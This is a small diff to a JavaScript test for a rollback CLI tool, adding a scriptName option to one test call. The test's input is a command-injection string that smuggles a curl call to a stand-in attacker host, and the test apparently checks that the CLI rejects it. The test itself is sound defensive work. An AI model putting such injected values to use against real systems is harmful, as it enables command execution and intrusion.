@@ -134,6 +134,7 @@ describe("runRollbackCli", () => {
     const code = await runRollbackCli(['evil"; curl attacker.example; echo "'], {
       accountId: "acct",
       apiToken: "token",
+      scriptName: "worker",
       fetchImpl,
     });
     assert.equal(code, 1);
